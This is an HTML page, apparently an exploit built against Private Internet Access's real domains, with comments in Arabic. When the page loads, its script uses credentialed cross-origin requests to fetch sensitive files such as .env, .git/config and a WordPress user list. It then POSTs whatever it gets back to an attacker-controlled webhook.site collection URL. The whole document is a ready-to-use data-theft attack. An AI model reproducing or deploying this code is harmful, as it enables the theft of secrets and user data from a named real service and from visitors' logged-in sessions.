<!DOCTYPE html>
<html>
<head>
    <title>PIA Deep CORS Exploit - Sensitive File Exfiltration</title>
</head>
<body>
    <h1>PIA CORS File Stealer</h1>
    <div id="log"></div>

    <script>
        // استبدل هذا برابط webhook.site الخاص بك
        const ATTACKER_SERVER = 'https://webhook.site/YOUR-UNIQUE-URL';

        const TARGETS = [
            // ملفات dev-api الحساسة (قد تكون محمية لكن نحاول)
            'https://dev-api.privateinternetaccess.com/.env',
            'https://dev-api.privateinternetaccess.com/.git/config',
            'https://dev-api.privateinternetaccess.com/health',
            // ملفات عامة حساسة
            'https://www.privateinternetaccess.com/openvpn/crl.pem',
            'https://www.privateinternetaccess.com/blog/wp-json/wp/v2/users',
            'https://api.privateinternetaccess.com/'
        ];

        function log(msg) {
            document.getElementById('log').innerHTML += '<p>' + msg + '</p>';
        }

        async function steal(target) {
            log('Trying: ' + target);
            try {
                const response = await fetch(target, {
                    credentials: 'include' // يرسل أي كوكيز متاحة
                });
                if (response.ok) {
                    const data = await response.text();
                    log('✅ STOLEN: ' + target);
                    // إرسال البيانات المسروقة إلى خادم الاستقبال
                    fetch(ATTACKER_SERVER, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            url: target,
                            content: data,
                            timestamp: new Date().toISOString()
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                } else {
                    log('❌ Failed (' + response.status + '): ' + target);
                }
            } catch (e) {
                log('❌ Error: ' + target + ' - ' + e.message);
            }
        }

        window.onload = () => {
            TARGETS.forEach(steal);
        };
    </script>
</body>
